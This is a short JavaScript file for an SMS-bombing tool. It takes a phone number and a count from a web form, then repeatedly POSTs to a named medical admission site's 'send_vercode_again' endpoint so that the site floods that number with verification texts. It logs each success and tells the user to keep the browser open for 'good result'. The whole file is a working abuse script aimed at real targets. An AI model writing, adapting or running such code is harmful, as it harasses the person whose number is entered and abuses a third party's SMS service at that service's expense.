const url = "https://admission.medico.com.bd/2023/send_vercode_again";
const headers = new Headers({
  "Content-Type": "application/x-www-form-urlencoded",
});

function makeRequests() {
  const number = document.getElementById("phoneNumber").value;
  const amount = document.getElementById("requestAmount").value;
  const logElement = document.getElementById("requestsLog");

  const data = new URLSearchParams();
  data.append("phone", number);

  for (let i = 0; i < amount; i++) {
    fetch(url, {
      method: "POST",
      headers: headers,
      body: data,
    })
      .then((response) => response.text())
      .then((responseData) => {
        if (responseData.includes("Msg sent")) {
          logElement.innerHTML += `<p> ${i + 1}: Msg sent successfully!</p>`;
        } else {
          logElement.innerHTML += `<p> ${i + 1}: Failed to send the message.</p>`;
        }
      });

    alert(`${amount} SMS Sending ${number} This number..For Good result keep the browser 3 minutes..`);
  }
}
